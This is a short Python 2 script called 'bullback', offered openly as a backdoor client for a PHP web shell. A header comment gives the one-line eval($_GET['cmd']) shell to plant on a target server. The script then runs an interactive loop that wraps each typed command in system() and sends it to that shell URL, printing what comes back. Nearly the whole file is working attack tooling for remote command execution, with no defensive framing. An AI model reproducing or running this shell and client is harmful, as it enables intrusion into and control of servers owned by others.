#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#       
#          Copyright 2014 @jofpin  <jofpin@gmail.com>
#
##############################################################################
import os                                                                    #
import sys                                                                   #
from sys import argv                                                         #
try:                                                                         #
    import requests                                                          #
except:                                                                      #
    print "\t\nPlease install requests library, you can do it executing: \n" #
    print "\t\npip install requests"                                         #
##############################################################################
#                                               #
# Code: <?php eval($_GET["cmd"]); ?>            #################
# It generates an effective rear connection with eval()         #
# Example: python bullback.py http://target.com/shell.php?cmd=  #
#                                               #################
#################################################
#
# Bullback > backdoor connection!
# For bullgit
#
if "linux" in sys.platform:
    os.system("clear")
elif "win" in sys.platform:
    os.system("cls")
else:
    pass

# Simplification
def go(value):
    print value

def main():
    # Colors 
    color = {"blue": "\033[94m", "green": "\033[92m", "white": "\033[0m", "red": "\033[91m", "yellow": "\033[93m"}

    go("\t\t--------------" + color['green'] + "bullback" + color['white'] + "------------")
    go("\t\tx      Developed by " + color['blue'] + "@jofpin" +  color['white'] + "      x")
    go("\t\tx           happy hacker         x")
    go("\t\t----------------------------------\n\n")
    
    nick = raw_input(color['yellow'] + "[!] " + color['white']  + "Your nick: " + color['white'])

    while True:

        cmd = raw_input(nick + ":~$ ")
        if cmd == "about": # Mini description & author of script
            go(color['blue'] + "\t\nHello, This is a small type of connection (backdoor) #!" + color['white'])
            go(color['blue'] + "\t\nWritter for " + color['green'] + "@jofpin" + color['white'])
        if cmd == "exit":
            go(color['blue'] + "Bullback: " + color['red'] + "OFF" + color['white'])
            break
        else:
            php = "system('" + cmd + "');"
            boom = argv[1] + php
            request = requests.get(boom)
            go(color['green'] + request.text.strip() + color['white'])

if __name__ == "__main__":
    main()
